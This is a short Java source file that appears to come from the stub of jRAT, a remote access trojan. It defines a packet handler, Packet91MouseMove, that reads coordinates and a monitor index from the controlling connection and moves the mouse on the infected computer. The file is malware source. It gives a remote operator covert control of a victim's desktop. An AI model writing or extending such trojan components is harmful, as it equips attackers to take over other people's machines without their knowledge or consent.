package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.utils.ScreenUtils;

public class Packet91MouseMove extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int x = Connection.instance.readInt();
		int y = Connection.instance.readInt();
		int monitor = Connection.instance.readInt();
		
		if (!ScreenUtils.isHeadless()) {
			if (monitor == -1) {
				ScreenUtils.getDefault().mouseMove(x, y);
			} else {
				ScreenUtils.getAllRobots()[monitor].mouseMove(x, y);
			}
		}
	}

}
